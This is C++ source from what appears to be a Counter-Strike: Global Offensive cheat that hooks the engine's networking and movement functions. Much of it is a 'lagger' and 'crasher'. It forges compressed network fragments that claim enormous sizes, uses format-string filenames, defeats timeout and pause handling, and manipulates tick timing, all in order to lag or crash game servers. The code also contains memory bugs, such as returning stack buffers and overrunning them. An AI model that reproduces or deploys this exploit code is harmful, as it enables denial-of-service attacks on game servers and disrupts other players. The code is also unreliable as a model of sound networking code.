
#pragma once
//#include <ws2tcpip.h>
#include <WinSock2.h>
#include <Ws2tcpip.h>
#include <Windows.h>
#pragma comment(lib, "ws2_32.lib")


#include "Hacks/Other/Debug.h"

#include "Hacks/TickbaseManager.h"
#include "Config.h"
#include "EngineHooks.h"


#include "Hacks/SendNetMSG/SendNetMsg.h"

#ifndef _DEBUG
#pragma comment(lib,"C:\\Users\\user\\source\\repos\\Harpoon\\Harpoon\\Resource\\Protobuf\\libprotobuf.lib")
#endif
#ifdef _DEBUG
#pragma comment(lib,"C:\\vcpkg\\installed\\x86-windows-static-md\\debug\\lib\\libprotobufd.lib")
#endif
//#pragma comment(lib,"../../Resource/Protobuf/libprotobuf.lib")


#include "Resource/Protobuf/Headers/cstrike15_gcmessages.pb.h"
#include "Resource/Protobuf/Headers/netmessages.pb.h"
#include "SDK/SDK/CNetMessageBinder.h"

#include "ClientHooks.h"
#include "SDK/OsirisSDK/Prediction.h"
#define MAX_CMD_BUFFER 4000


#define TICK_INTERVAL			(memory->globalVars->intervalPerTick)
#define TIME_TO_TICKS( dt )		( (int)( 0.5f + (float)(dt) / TICK_INTERVAL ) )
#include "SDK/OsirisSDK/LocalPlayer.h"
#include "SDK/OsirisSDK/Entity.h"
#include "Timing.h"
#include "SDK/OsirisSDK/NetworkChannel.h"
#include "Hooks.h"

#include "Memory.h"
#include "Other/EnginePrediction.h"

#include "Other/MessageSender.h"
namespace EngineHooks {
	bool wasInLag = false;

	__declspec(naked) void Run_Original_CL_Move2()
	{
		__asm PUSH EBP
		__asm MOV EBP, ESP
		__asm SUB ESP, 0x164
		__asm jmp EngineHooks::oCL_Move;
	}

	void Run_Original_CL_Move(float accumulated_extra_samples, bool bFinalTick)
	{
		__asm movss xmm0, accumulated_extra_samples
		__asm mov cl, bFinalTick
		Run_Original_CL_Move2();
	}

	__declspec(naked) void Hooked_CL_Move()
	{
		__asm
		{
			sub esp, 8
			movzx ecx, cl
			mov[esp + 4], ecx
			movss[esp], xmm0
			call EngineHooks::CL_Move
			add esp, 8
			ret
		}
	}


    void CL_Move( float fAccumulatedExtraSamples, bool bFinalTick)
    {	
#if 1
		if(config->debug.bNoRender)
			Run_Original_CL_Move(fAccumulatedExtraSamples, bFinalTick);

		if (Timing::ExploitTiming.m_nTicksLeftToDrop > 0)
		{
			Timing::ExploitTiming.m_nTicksLeftToDrop--;
			Timing::ExploitTiming.m_LastCmd.hasbeenpredicted = false;
			Timing::ExploitTiming.m_LastCmd.tickCount++;
			Timing::ExploitTiming.m_LastCmd.commandNumber++;
			EnginePrediction::run(&Timing::ExploitTiming.m_LastCmd);



			/* TODO: Just Hot the intermediary data shit.... */
			static ConVar* net_maxroutable = interfaces->cvar->findVar("cl_predict");
			if (Timing::ExploitTiming.m_nTicksLeftToDrop > 0)
			{
				net_maxroutable->onChangeCallbacks.size = 0;
				net_maxroutable->m_bHasMin = false;
				net_maxroutable->m_bHasMax = false;
				net_maxroutable->setValue(0);
			}
			else {
				net_maxroutable->onChangeCallbacks.size = 0;
				net_maxroutable->m_bHasMin = false;
				net_maxroutable->m_bHasMax = false;
				net_maxroutable->setValue(1);
			}

#ifdef WHYDIDITHINKTHATWOULDWORK
#endif
			return;
		}
#endif


		if (GetAsyncKeyState(VK_HOME))
			return;



		if (GetAsyncKeyState(config->TestShit.fuckKey9) || Timing::ExploitTiming.m_bNetworkedFreeze) {
			Run_Original_CL_Move(fAccumulatedExtraSamples, bFinalTick);
			return;
		}



		if (Tickbase::OnCLMove(fAccumulatedExtraSamples, bFinalTick))
			return;


		static int lastTick{ 0 };
		static float lastCallTime{0};
		if (Timing::TimingSet_s.m_bInPredictionMode) {
			if ((memory->globalVars->currenttime - lastCallTime) < memory->globalVars->intervalPerTick) {
				return;
			}
			else {
				lastCallTime = memory->globalVars->currenttime;		
			}
		}
		else {
			lastCallTime = memory->globalVars->currenttime;
		}


		if (g_InLag && !wasInLag) {
			wasInLag = true;
		}

		bool boolt = true;


		if (config->debug.Lagger || config->lagger.FULLONBOGANFUCKERY) {
			memory->clientState->paused = false;
		}

		if (config->debug.LocalTiming) {
			bFinalTick = true;
		}



		if (Timing::TimingSet_s.m_bShouldPredictMore) {
			for (; Timing::TimingSet_s.m_nOutDeltaTick > memory->clientState->deltaTick; memory->clientState->deltaTick++) {
				Run_Original_CL_Move(fAccumulatedExtraSamples, bFinalTick);
			}
		}
		else {
			Run_Original_CL_Move(fAccumulatedExtraSamples, bFinalTick);
		}
        return;
    }



	void __cdecl CL_SendMove(void* ecx, void* edx) {
		typedef void(__cdecl CL_SendMoveFunc)(void);
		byte data[MAX_CMD_BUFFER];

		int nextcommandnr = memory->clientState->lastOutgoingCommand + memory->clientState->chokedCommands + 1;

		
		// send the client update packet

		CLC_Move moveMsg;
		moveMsg.data.m_pData = (unsigned long*)malloc(9600);
		moveMsg.data.StartWriting(data, sizeof(data));

		// Determine number of backup commands to send along
		int cl_cmdbackup = 2;
		moveMsg.num_backup_commands = std::clamp(cl_cmdbackup, 0, 50);

		// How many real new commands have queued up
		moveMsg.num_new_commands = 1 + memory->clientState->chokedCommands;
		moveMsg.num_new_commands = std::clamp(moveMsg.num_new_commands, (uint32_t)0, (uint32_t)50);

		int numcmds = moveMsg.num_new_commands + moveMsg.num_backup_commands;

		int from = -1;	// first command is deltaed against zeros 

		bool bOK = true;

		int slot = -1;
		for (int to = nextcommandnr - numcmds + 1; to <= nextcommandnr; to++)
		{
			bool isnewcmd = to >= (nextcommandnr - moveMsg.num_new_commands + 1);

			// first valid command number is 1
			bOK = bOK && ClientHooks::WriteUsercmdDeltaToBuffer(interfaces->client,0, slot, &moveMsg.data, from, to, isnewcmd);
			from = to;
			slot++;
		}

		if (bOK)
		{
			// only write message if all usercmds were written correctly, otherwise parsing would fail
			interfaces->engine->getNetworkChannel()->SendNetMsg(reinterpret_cast<NetworkMessage*>(&moveMsg), false, false);
		}

		
		free(moveMsg.data.m_pData);
		return;
	}


    
}




typedef void(__thiscall* DrawWorldListsFunc)(void*, void* pList, int flags, float waterZAdjust);

int __fastcall EngineHooks::DrawWorldLists(void* _this, void* edx, void* pList, int flags, float waterZAdjust) noexcept{

    if (config->debug.HardMode) {
        return 0;
    }

    try {
        ((DrawWorldListsFunc)DrawWorldLists)(_this, pList, flags, waterZAdjust);
    }
    catch (std::exception& e) {

        Debug::QuickPrint(e.what(), false);
    }


}

typedef bool(__stdcall* NET_BufferToBufferCompressFunc)(char* dest, unsigned int* destLen, char* source, unsigned int sourceLen);

bool __stdcall EngineHooks::NET_BufferToBufferCompress(char* dest, unsigned int* destLen, char* source, unsigned int sourceLen) {

    Debug::QuickPrint("In Net_BufferToBufferCompress");

    return ((NET_BufferToBufferCompressFunc)oNET_BufferToBufferCompress)(dest, destLen, source, sourceLen);
}




#include "SDK/SDK/Tier0/utlvector.h"
/*
typedef struct dataFragments_s
{
	void* file;			// open file handle
	char			filename[MAX_PATH]; // filename
	char* buffer;			// if NULL it's a file
	unsigned int	bytes;			// size in bytes
	unsigned int	bits;			// size in bits
	unsigned int	transferID;		// only for files
	bool			isCompressed;	// true if data is bzip compressed
	unsigned int	nUncompressedSize; // full size in bytes
	bool			asTCP;			// send as TCP stream
	int				numFragments;	// number of total fragments
	int				ackedFragments; // number of fragments send & acknowledged
	int				pendingFragments; // number of fragments send, but not acknowledged yet
} dataFragments_t;
*/
const char* DataFragmentDebugStr(dataFragments_t* dataFrag) {

	char buffer[2048];
	const char* formatter = {
		"  dataFragment_t:       \n"
		"file               = %d \n"
		"fileName           = %s \n"
		"transferID         = %d \n"
		"bytes              = %d \n"
		"bits               = %d \n"
		"isCompressed       = %d \n"
		"nUncompressed Size = %d \n"
		"asTCP              = %d \n"
		"numFragments       = %d \n"
		"ackedFragments     = %d \n"
		"pendingFragments   = %d \n"
	};

	snprintf(buffer, 2058, formatter,
		dataFrag->file,
		dataFrag->filename,
		dataFrag->transferID,
		dataFrag->bytes,
		dataFrag->bits,
		dataFrag->isCompressed,
		dataFrag->nUncompressedSize,
		dataFrag->asTCP,
		dataFrag->numFragments,
		dataFrag->ackedFragments,
		dataFrag->pendingFragments);

	return buffer;

}

const char* PrintBufferData(bf_write* buf) {

	char buffer[2048];
	const char* formatter = {
		"  m_pData             :   %d    \n"
		"  m_nDataBytes        :   %d    \n"
		"  m_nDataBits         :   %d    \n"
		"  m_iCurBit           :   %d    \n"
		"  m_bOverflow         :   %d    \n"
		"  m_bAssertOnOverflow :   %d    \n"
	};

	snprintf(buffer, 2058, formatter,
		buf->m_pData,
		buf->m_nDataBytes,
		buf->m_nDataBits,
		buf->m_iCurBit,
		buf->m_bOverflow,
		buf->m_bAssertOnOverflow);

	return buffer;


}

#include "SDK/SDK/clzss.h"
#define LZSS_LOOKSHIFT    4
#define LZSS_IDR           1397971532
typedef void(__thiscall* CNET_CompressFragmentsFunc)(void*);
void __fastcall EngineHooks::CNET_CompressFragments(void* ecx, void* edx) {
	NetworkChannel* netchan = reinterpret_cast<NetworkChannel*>(ecx);

	if (!config->debug.Lagger && !config->lagger.FULLONBOGANFUCKERY) {
		((CNET_CompressFragmentsFunc)oCNET_CompressFragments)(ecx);
		return;
	}

	uintptr_t pWaitingList = (uintptr_t)ecx + 296;

	for (int i = 0; i < MAX_STREAMS; i++)
	{

		if (*(DWORD*)(pWaitingList + 12)) {
			dataFragments_t* data = **(dataFragments_t***)(pWaitingList);

			//if (!config->backtrack.enabled) {
				if (data->ackedFragments > 0 || data->pendingFragments > 0)
					continue;
			//}
			// if we already started sending this block, we can't compress it anymore
			if (data->buffer) {

					if (config->debug.Lagger ) {
						int psize = (int)(67108863.f * ((float)config->lagger.PacketSize) / 10);
						data->isCompressed = true;
						*(std::int32_t*)data->buffer = LZSS_ID;
						strcpy(data->filename, "%s%s%s%s%s%s\0");
						*(std::int32_t*)(data->buffer + sizeof(int32_t)) = (int32_t)psize;
						data->nUncompressedSize = psize;
						data->bytes = psize / 2;
					}				
			}
			else if (false) {
					int psize = (int)(67108863.f * ((float)config->lagger.PacketSize) / 10);
					data->isCompressed = true;
					*(std::int32_t*)data->buffer = LZSS_ID;
					strcpy(data->filename, "%s%s%s%s%s%s\0");
					*(std::int32_t*)(data->buffer + sizeof(int32_t)) = (int32_t)psize;
					data->nUncompressedSize = psize * 2;
					data->bytes = psize / 2;			
			}
			else if (config->lagger.FULLONBOGANFUCKERY) {
				int psize = (int)(67108863.f * ((float)config->lagger.PacketSize) / 10);
				data->isCompressed = true;
				*(std::int32_t*)data->buffer = LZSS_ID;
				strcpy(data->filename, "%s%s%s%s%s%s\0");
				*(std::int32_t*)(data->buffer + sizeof(int32_t)) = (int32_t)psize;
				data->nUncompressedSize = psize;
				data->bytes = psize / 2;
			}


			else {
				Debug::QuickPrint("EngineHooks::CNET_CompressFragments Calling Original (File)");
				((CNET_CompressFragmentsFunc)oCNET_CompressFragments)(ecx);
				return;
			}

			pWaitingList += 20;
		}
	}
	//((CNET_CompressFragmentsFunc)oCNET_CompressFragments)(ecx);
	//return;
}




#define PAD_NUMBER(number, boundary) \
	( ((number) + ((boundary)-1)) / (boundary) ) * (boundary)





typedef int(__fastcall* UtlVectorAddToTailFunc)(void* ecx, int a2, DWORD* a3);

typedef bool(__thiscall* CNET_CreateFragmentsFromBufferFunc)(void*, bf_write* buffer, int stream);

bool __fastcall EngineHooks::CNET_CreateFragmentsFromBuffer(void* ecx, void* edx, void* buff, int stream) {

	//Debug::QuickPrint("In CreateFragmentsFromBuffer!");
	bf_write* buffer = reinterpret_cast<bf_write*>(buff);

	bool ret = ((CNET_CreateFragmentsFromBufferFunc)oCNET_CreateFragmentsFromBuffer)(ecx, buffer, stream);
	return ret;
#if 0

	//bf_write* buffer = reinterpret_cast<bf_write*>(buff);
	NetworkChannel* netchann = reinterpret_cast<NetworkChannel*>(ecx);

	uintptr_t pWaitingList = (uintptr_t)ecx + (uintptr_t)296;

	bf_write bfwrite;
	dataFragments_t* data = NULL;

	// if we have more than one item in the waiting list, try to add the 
	// reliable data to the last item. that doesn't work with the first item
	// since it may have been already send and is waiting for acknowledge

	pWaitingList += 20 * stream;

	if (!((std::uintptr_t*)ecx)[77]) {
		//Debug::QuickPrint("Line 285 Exit");
		return false;
	}

	int count = *(int*)((std::uintptr_t*)ecx)[77];



	if (count > 1)
	{
		// get last item in waiting list
		data = ((dataFragments_t**)pWaitingList)[count - 1];

		int totalBytes = Bits2Bytes(data->bits + buffer->GetNumBitsWritten());

		totalBytes = PAD_NUMBER(totalBytes, 4); // align to 4 bytes boundary

		if (totalBytes < NET_MAX_PAYLOAD && data->buffer)
		{
			// we have enough space for it, create new larger mem buffer
			char* newBuf = new char[totalBytes];

			ehQ_memcpy(newBuf, data->buffer, data->bytes);

			delete[] data->buffer; // free old buffer

			data->buffer = newBuf; // set new buffer

			bfwrite.StartWriting(newBuf, totalBytes, data->bits);
		}
		else
		{
			data = NULL; // reset to NULL
		}
	}
	else {
		//Debug::QuickPrint("Line 322, no Data");
	}

	// if not added to existing item, create a new reliable data waiting buffer
	if (!data)
	{
		int totalBytes = Bits2Bytes(buffer->GetNumBitsWritten());

		totalBytes = PAD_NUMBER(totalBytes, 4); // align to 4 bytes boundary

		data = new dataFragments_t;
		data->bytes = 0;	// not filled yet
		data->bits = 0;
		data->buffer = new char[totalBytes];
		data->isCompressed = false;
		data->isReplayDemo = false;
		data->nUncompressedSize = 0;
		data->file = NULL;
		data->filename[0] = 0;
		bfwrite.StartWriting(data->buffer, totalBytes);
		((UtlVectorAddToTailFunc)memory->CUtlVector_AddToTail)((std::uintptr_t*)ecx+74, (int)((std::uintptr_t*)ecx+74)[77], (DWORD*)&data);	// that's it for now
	}

	// write new reliable data to buffer
	bfwrite.WriteBits(buffer->GetData(), buffer->GetNumBitsWritten());

	// fill last bits in last byte with NOP if necessary
	int nRemainingBits = bfwrite.GetNumBitsWritten() % 8;
	if (nRemainingBits > 0 && nRemainingBits <= (8 - NETMSG_TYPE_BITS))
	{
		CNETMsg_NOP_t nop;
		nop.WriteToBuffer(bfwrite);
	}

	// update bit length
	data->bits += buffer->GetNumBitsWritten();
	data->bytes = Bits2Bytes(data->bits);

	// check if send as stream or with snapshot
	data->asTCP = (data->bytes > netchann->m_MaxReliablePayloadSize);

	// calc number of fragments needed
	data->numFragments = BYTES2FRAGMENTS(data->bytes);
	data->ackedFragments = 0;
	data->pendingFragments = 0;

	return true;



	//bool ret = ((CNET_CreateFragmentsFromBufferFunc)oCNET_CreateFragmentsFromBuffer)(ecx, buffer, stream);
	//return ret;
#endif
}

#include "SDK/SDK/clzss.h"

#define FILESYSTEM_INVALID_HANDLE NULL
#define NET_MAX_PAYLOAD_BITS 19
/*
#ifdef FRAGMENT_SIZE
#undef FRAGMENT_SIZE
#endif
#define FRAGMENT_SIZE 256
*/








typedef bool(__fastcall* WriteStringFunc)(void*, const char* pStr);
bool WriteString(void* buf, const char* pStr)
{
	return ((WriteStringFunc)memory->bf_write_String)(buf, pStr);

}

typedef bool(__fastcall* WriteUBitLongFunc)(void*, unsigned int curData, int numbits, bool bCheckRange);
bool WriteUBitLong(void* _this,unsigned int curData, int numbits, bool bCheckRange = false) 
{
	return ((WriteUBitLongFunc)memory->bf_write_WriteUBitLong)(_this, curData, numbits, bCheckRange);
}


typedef bool(__fastcall* WriteBitsFunc)(void*, const void*, uint32);

bool WriteBytes(void* _this, const void* pBuf, int nBytes)
{
	return ((WriteBitsFunc)memory->bf_write_WriteBits)(_this, pBuf, nBytes *8);
}



#if 0
#define NET_MAX_PAYLOAD_BITS 19
#define MAX_FILE_SIZE_BITS 26
#define MAX_FILE_SIZE        ((1<<MAX_FILE_SIZE_BITS)-1)
#define FRAGMENT_BITS        8
#define FRAGMENT_SIZE        (1<<FRAGMENT_BITS)
#define BYTES2FRAGMENTS(i) ((i+FRAGMENT_SIZE-1)/FRAGMENT_SIZE)
#define NET_MAX_PAYLOAD 524284
#endif


typedef char(__fastcall* CNET_SendTCPDataFunc)(void*);


typedef bool(__thiscall* CNET_SendSubChannelDataFunc)(void* _this, void* buf);
bool TrueFragmentToSub(NetworkChannel* netchannel, bf_write* buf) {


	if (config->misc.autoAccept) {
		return ((CNET_SendSubChannelDataFunc)oCNET_SendSubChannelData)(netchannel, buf);
	}


	//EngineHooks::CNET_CompressFragments(netchannel, 0);
	((CNET_CompressFragmentsFunc)oCNET_CompressFragments)(netchannel);
	((CNET_SendTCPDataFunc)memory->CNetChan_SendTcpData)(netchannel);





	subChannel_s* subChan = NULL;

	uintptr_t m_SubChannels = ((uintptr_t)netchannel + (uintptr_t)944);
	int i = 0;
	uintptr_t* v39;
	do
	{
		subChan = (subChannel_s*)m_SubChannels;
		v39 = (uintptr_t*)m_SubChannels;
		if ((*(uintptr_t*)(m_SubChannels + (uintptr_t)20)) == SUBCHANNEL_TOSEND) {
			Debug::QuickPrint("Found Data To Send");
			break;
		}
		++i;
		m_SubChannels += (uintptr_t)28;
	} while (i < MAX_SUBCHANNELS);




	if (i == MAX_SUBCHANNELS) {
		//Debug::QuickPrint("MAX_SUBCHANNELS");
		return false;
	}

	Debug::QuickPrint("464");

	int subChannel = 0;

	//buf->WriteUBitLong(i, 3);

	buf->WriteUBitLong(i, 3);

	uintptr_t m_pWaitingList = ((uintptr_t)netchannel + (uintptr_t)296);
	for (i = 0; i < MAX_STREAMS; i++)
	{
		subChannel = i;
		if (subChan->numFragments[i] == 0)
		{
			Debug::QuickPrint("523");
			Debug::QuickPrint(std::to_string(offsetof(bf_write, m_iCurBit)).c_str());
			buf->WriteOneBit(0); // no data for this stream
			m_pWaitingList += (uintptr_t)20;
			continue;
		}

		Debug::QuickPrint("479");

		uintptr_t** dataPtr = (uintptr_t**)m_pWaitingList;


		dataFragments_t* data = **(dataFragments_t***)(dataPtr);

		Debug::QuickPrint(DataFragmentDebugStr(data));
		

		buf->WriteOneBit(1); // data follows:

		unsigned int offset = subChan->startFraggment[i] << 8;
		unsigned int length = subChan->numFragments[i] << 8;




		if ((subChan->startFraggment[i] + subChan->numFragments[i]) == data->numFragments)
		{
			// we are sending the last fragment, adjust length
			int rest = 256 - data->bytes;
			if (rest < 256)
				length -= rest;
		}




		Debug::QuickPrint(std::string("offset " + std::to_string(offset)).c_str());
		Debug::QuickPrint(std::string("length " + std::to_string(length)).c_str());
		Debug::QuickPrint(std::string("subchannel " + std::to_string(subChannel)).c_str());
		Debug::QuickPrint(std::string("subChan->startFraggment[i] " + std::to_string(subChan->startFraggment[i])).c_str());
		Debug::QuickPrint(std::string("subChan->numFragments[i] " + std::to_string(subChan->numFragments[i])).c_str());
		// if all fragments can be send within a single packet, avoid overhead (if not a file)
		bool bSingleBlock = (subChan->numFragments[i] == data->numFragments) &&
			(data->file == FILESYSTEM_INVALID_HANDLE);

		if (bSingleBlock)
		{
			Debug::QuickPrint("SingleBlock");


			buf->WriteOneBit(0);	// single block bit
			//

			// data compressed ?
			if (data->isCompressed)
			{
				buf->WriteOneBit(1);
				buf->WriteUBitLong(data->nUncompressedSize, MAX_FILE_SIZE_BITS);
			}
			else
			{
				buf->WriteOneBit(0);

			}
			buf->WriteUBitLong(data->bytes, NET_MAX_PAYLOAD_BITS);


		}
		else
		{
			Debug::QuickPrint("!bSingleBlock");
			buf->WriteOneBit(1); // uses fragments with start fragment offset byte
			buf->WriteUBitLong(subChan->startFraggment[i], (MAX_FILE_SIZE_BITS - FRAGMENT_BITS));
			buf->WriteUBitLong(subChan->numFragments[i], 3);

			if (offset == 0)
			{
				Debug::QuickPrint("Offset == 0");
				// this is the first fragment, write header info

				if (data->file != FILESYSTEM_INVALID_HANDLE)
				{
					Debug::QuickPrint("FILEEEE");
					buf->WriteOneBit(1); // file transmission net message stream
					buf->WriteUBitLong(data->transferID, 32);
					buf->WriteString(data->filename);



					if (data->asTCP || data->isReplayDemo)
					{
						buf->WriteOneBit(1);
					}
					else
					{
						buf->WriteOneBit(0);
					}
				}
				else
				{
					buf->WriteOneBit(0); // normal net message stream
				}

				// data compressed ?
				if (data->isCompressed)
				{
					buf->WriteOneBit(1);
					buf->WriteUBitLong(data->nUncompressedSize, MAX_FILE_SIZE_BITS);
				}
				else
				{
					buf->WriteOneBit(0);
				}

				buf->WriteUBitLong(data->bytes, MAX_FILE_SIZE_BITS); // 4MB max for files
			}
		}


		// write fragments to buffer
		if (data->buffer)
		{
			Debug::QuickPrint("638");
			//Assert(data->file == FILESYSTEM_INVALID_HANDLE);
			// send from memory block
			buf->WriteBytes(data->buffer + offset, length);
		}
		else // if ( data->file != FILESYSTEM_INVALID_HANDLE )
		{
			Debug::QuickPrint("FILE");
			buf->WriteBytes(data->buffer, length);
		}


		char str_buffer[2048];

		snprintf(str_buffer, 2048, "Sending subchan %i: start %i, num %i\n", v39[6], subChan->startFraggment[subChannel], subChan->numFragments[subChannel]);

		Debug::QuickPrint(str_buffer);

		v39[4] = *((uintptr_t*)netchannel + 6);
		v39[5] = SUBCHANNEL_WAITING;

		m_pWaitingList += (uintptr_t)20;

	}

	Debug::QuickPrint(PrintBufferData(buf));
	return true;
}

void WriteFragmentsToSubChannel(void* netchannel, dataFragments_t* data, bf_write* buf, int stream, int totalBytes, bool File = false, bool NULLFILE = false) {
	buf->WriteUBitLong(stream, 3); // SubChannel
	buf->WriteOneBit(1); // Data Follows

	if (!File) {
		buf->WriteOneBit(0); // We Are Using A Single Block
		buf->WriteOneBit(1); // Data Is Compressed
		buf->WriteUBitLong(data->nUncompressedSize, MAX_FILE_SIZE_BITS); // Data Size
		buf->WriteUBitLong(data->bytes, NET_MAX_PALYLOAD_BITS); // Data Size Of Buff
		//buf->WriteBytes(data->buffer, totalBytes); // Finally Write Buffer Data	
	}
	else {
		buf->WriteOneBit(1); // Not Single Block
		buf->WriteUBitLong(0, (MAX_FILE_SIZE_BITS - FRAGMENT_BITS)); // startFragment
		buf->WriteUBitLong(0, 3); // numFragment

		buf->WriteOneBit(1); // A File

		if (!NULLFILE) {
			buf->WriteUBitLong(600, 32);
			buf->WriteString(data->filename);
		}
		else {
			buf->WriteUBitLong(999, 32);
			buf->WriteString("%s%s%s%s\0");
		}
		// transfer ID
		// fileName


		buf->WriteOneBit(0);


		buf->WriteOneBit(1); // Data Compressed


		buf->WriteUBitLong(data->bytes, MAX_FILE_SIZE_BITS); // Data Bytes
	}

	buf->WriteBytes(data->buffer, totalBytes); // Finally Write Buffer Data	


}


class bitbuf_base {
public:
	uintp* __restrict m_pData;
	uint32 m_nDataBytes;
	uint32 m_nDataBits;
	uint32 m_nCurBit;
};



#ifdef LAGGER
class LZSSLagger {

public:
	bool init = false;
	unsigned char* LZSSData;
	unsigned int output_size = 0;
	int SizeOfFakePacket = (67108863 * 2);
	int lastPacketSize = 0;


	LZSSLagger(int size) { Init(size); }
	void Init(int size) {

			lastPacketSize = size;
			CLZSS Compressor;
			char* buffer = (char*)malloc(SizeOfFakePacket + 8);

			for (int i = 0; i < SizeOfFakePacket; i += 8) {
				*(int64_t*)&buffer[i] = (int64_t)rand() % 0x7FFFFFFFFFFFFFFF;
			}
			LZSSData = Compressor.Compress((unsigned char*)buffer, SizeOfFakePacket, &output_size);
			init = true;
		
	}
	int CreateLZSSData(char** buffer_to_write) {

		if (!init) {
			//Debug::QuickPrint("Writing LZSSData to Store Buffer");
			Init(config->lagger.SubChannelPacketSize);
		}


		if (((lastPacketSize != config->lagger.SubChannelPacketSize) && init) || !init) {
			if (init) {
				free(LZSSData);
				init = false;
			}
			SizeOfFakePacket = (int)((float)(67108863.f * 2.f) * ((((float)config->lagger.SubChannelPacketSize - .5f) / 20.f)));
			//if (config->mmlagger.enabled) {
			//	SizeOfFakePacket = SizeOfFakePacket / 10;
			//}
			init = false;
			lastPacketSize = config->lagger.SubChannelPacketSize;
			Init(config->lagger.SubChannelPacketSize);
		}
		*buffer_to_write = (char*)LZSSData;
		return output_size;
	}
};

//extern LZSSLagger g_LZSSLagCreator(22);






#endif


struct ParamsForLag {
	NetworkChannel* netChann;
	bf_write* buf;
};
static void _cdecl LagThread(LPVOID pParam) {
	ParamsForLag params = *(ParamsForLag*)pParam;

	while (true) {
		if ((g_bHasSentLagData < 1) || !config->lagger.skipOnCount) {
			//Debug::QuickPrint("Writing Fake LZSS Data");
			dataFragments_s* data = new dataFragments_t;
			//data->bytes = g_LZSSLagCreator.CreateLZSSData(&data->buffer);
			*(int32_t*)data->buffer = (int32_t)SNAPPY_ID;
			data->bits = data->bytes * 8;
			data->isCompressed = true;
			data->isReplayDemo = false;
			data->nUncompressedSize = *(data->buffer + sizeof(int32_t));
			data->file = (void*)999;
			strcpy(data->filename, "%s%s%s%s\0");
			WriteFragmentsToSubChannel(params.netChann, data, params.buf, 0, data->bytes);
			//WriteCrasherData(buf, data, data->bytes, 0);
			params.buf->m_bOverflow = false;
			g_bHasSentLagData++; /* This may require a mutex */
			return;
		}
	}



}



void WriteCrasherData(bf_write* buf, dataFragments_t* data, int size, int stream) {


	buf->WriteUBitLong(stream, 3); // SubChannel Index

	buf->WriteOneBit(1); // Data Follows

	//buf->WriteOneBit(1); // Not Single Block (Too Allow File Transfer)


	buf->WriteOneBit(1); // uses fragments with start fragment offset byte

	buf->WriteUBitLong(0, MAX_FILE_SIZE_BITS - FRAGMENT_BITS);

	buf->WriteUBitLong(1, 3);  // Write it to 0


	// We are first fragment (make sure you assure that.)

	buf->WriteOneBit(1); // It "Is A File" (Bypass ProcessMessages & "Process Time Exceeded" )

	buf->WriteUBitLong(data->transferID, 32);

	//buf->WriteString(data->filename);
	buf->WriteByte(1);
	buf->WriteByte(0);

	buf->WriteOneBit(0); // Not A Replay Demo

	buf->WriteOneBit(1); // Data is compressed (HIT LZSS)

	//buf->WriteUBitLong(*(data->buffer + sizeof(int32_t)), MAX_FILE_SIZE_BITS);
	buf->WriteUBitLong(data->nUncompressedSize, MAX_FILE_SIZE_BITS);
	buf->WriteUBitLong(data->bytes, MAX_FILE_SIZE_BITS);

	buf->WriteBytes(data->buffer, size); // write data
}

static bool init = false;
unsigned char* LZSSData;
unsigned int output_size = 0;
int SizeOfFakePacket = (67108863 * 2);
int lastPacketSize = 0;
int CreateLZSSData(char** buffer_to_write) {


	if (((lastPacketSize != 11) && init) || !init) {
		if (init) {
			free(LZSSData);
		}
		SizeOfFakePacket = (int)((float)(67108863.f * 2.f) * (((float)11 / 10.f)));

		//if (config->mmlagger.enabled) {
		//	SizeOfFakePacket = SizeOfFakePacket / 10;
		//}

		init = false;
		lastPacketSize = 11;
	}



	if (!init) {
		lastPacketSize = 11;
		CLZSS Compressor;
		char* buffer = (char*)malloc(SizeOfFakePacket + 8);

		for (int i = 0; i < SizeOfFakePacket; i += 8) {
			*(int64_t*)&buffer[i] = (int64_t)rand() % 0x7FFFFFFFFFFFFFFF;
		}

		Debug::QuickPrint("Writing LZSSData to Store Buffer");
		LZSSData = Compressor.Compress((unsigned char*)buffer, SizeOfFakePacket, &output_size);
		init = true;
	}
	*buffer_to_write = (char*)LZSSData;
	return output_size;
}



class CLZZSCOMMINT {
public:
	CLZZSCOMMINT() {
		char* data;
		CreateLZSSData(&data);
		return;
	}
};

//extern CLZZSCOMMINT g_Init;

void EngineHooks::InitLaggers() {
	//CLZZSCOMMINT g_Init;
	//LZSSLagger g_LZSSLagCreator(22);
}
#include "SDK/SDK/IFileSystem.h"

#include "../../Memory.h"
#include <winnt.h>

void EngineHooks::SendCrasherData()
{
	


}



typedef void(__thiscall* SetTimeOutFunc)(void*, float, bool);
bool __fastcall EngineHooks::CNET_SendSubChannelData(void* ecx, void* edx,  void* bufIn) {


	/* Not the best place to do this by idk where else to drop it. Basically This forces Timeout to 0 & makes sure we never are "paused" which
	   i've never seen actually happening other than when I force it on the server using sv_pausable 1 to test anti-lagger stuff               */
	*(float*)((uintptr_t)ecx + (uintptr_t)16732) = -1;
	memory->clientState->paused = false;



	sizeof(NetworkChannel);

	bf_write* buf = reinterpret_cast<bf_write*>(bufIn); // = new bf_write;

	if (config->debug.Lagger || config->lagger.FULLONBOGANFUCKERY ) {
		buf->m_bOverflow = false;
	}
	
	//bool orgRet = SendSubchannelData((NetworkChannel*)ecx, edx, (bf_write*)bufIn);//((CNET_SendSubChannelDataFunc)oCNET_SendSubChannelData)(ecx, bufIn);
	bool orgRet = false;

	orgRet = ((CNET_SendSubChannelDataFunc)oCNET_SendSubChannelData)(ecx, bufIn);

	if (config->debug.Lagger || config->lagger.FULLONBOGANFUCKERY) {
		buf->m_bOverflow = false;
	}
#ifdef LAGGER
	if (orgRet) { // Func Failed
		buf->m_bOverflow = false;
		return orgRet;
	}
	else if (config->debug.Lagger) {
		static ParamsForLag NewParams;
		NewParams.netChann = (NetworkChannel*)ecx;
		NewParams.buf = buf;

#ifdef THREADED_LAGGER
		static bool init{ false };
		if (!init) {
			_beginthread(LagThread, 0, &NewParams);
			init = true;
		}
#else
		if ((g_bHasSentLagData < 1) || !config->lagger.skipOnCount ) {
			*(float*)((uintptr_t)ecx + (uintptr_t)16732) = -1;
			Debug::QuickPrint("Writing Fake LZSS Data");
			dataFragments_s* data = new dataFragments_t;
			//data->bytes = g_LZSSLagCreator.CreateLZSSData(&data->buffer);
			*(int32_t*)data->buffer = (int32_t)SNAPPY_ID;
			data->bits = data->bytes * 8;
			data->isCompressed = true;
			data->isReplayDemo = false;
			data->nUncompressedSize = *(data->buffer + sizeof(int32_t));
			data->file = (void*)999;
			strcpy(data->filename, "%s%s%s%s\0");
			WriteFragmentsToSubChannel(ecx, data, buf, 0, data->bytes);
			
			//WriteCrasherData(buf, data, data->bytes, 0);
			buf->m_bOverflow = false;
			g_bHasSentLagData++;
			return true;
		}
#endif
	}
	else if (0) {
		memory->clientState->deltaTick++;

